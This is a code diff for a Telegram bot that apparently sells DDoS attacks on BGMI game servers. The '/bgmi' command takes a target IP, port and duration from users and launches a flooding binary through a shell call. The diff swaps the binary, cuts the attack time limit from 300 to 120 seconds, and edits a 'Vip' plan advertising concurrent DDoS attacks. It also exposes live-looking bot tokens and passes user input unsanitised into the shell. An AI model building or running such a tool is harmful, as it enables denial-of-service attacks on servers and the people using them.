@@ -8,7 +8,7 @@ import os
 from keep_alive import keep_alive
 keep_alive()
 # insert your Telegram bot token here
-bot = telebot.TeleBot('7955245382:AAHS62duTTlDYlcIzIQ7AuwlDpj4rMt1rmE')
+bot = telebot.TeleBot('7647515503:AAG8MtATd-RDRTngBRFuYgn--ZX1cB_4qbc')
 
 # Admin user IDs
 admin_id = ["6437994839"]
@@ -307,13 +307,13 @@ def handle_bgmi(message):
             target = command[1]
             port = int(command[2])  # Convert port to integer
             time = int(command[3])  # Convert time to integer
-            if time > 300:
-                response = "Error: Time interval must be less than 300."
+            if time > 120:
+                response = "Error: Time interval must be less than 120."
             else:
                 record_command_logs(user_id, '/bgmi', target, port, time)
                 log_command(user_id, target, port, time)
                 start_attack_reply(message, target, port, time)  # Call start_attack_reply function
-                full_command = f"./raja {target} {port} {time} 9 900"
+                full_command = f"./mrinmoy {target} {port} {time} 900"
                 process = subprocess.run(full_command, shell=True)
                 response = f"BGMI Attack Finished. Target: {target} Port: {port} Time: {time}"
                 bot.reply_to(message, response)  # Notify the user that the attack is finished
@@ -395,7 +395,7 @@ def welcome_plan(message):
     response = f'''{user_name}, Brother Only 1 Plan Is Powerfull Then Any Other Ddos !!:
 
 Vip 🌟 :
--> Attack Time : 300 (S)
+-> Attack Time : 120 (S)
 > After Attack Limit : 10 sec
 -> Concurrents Attack : 5
 
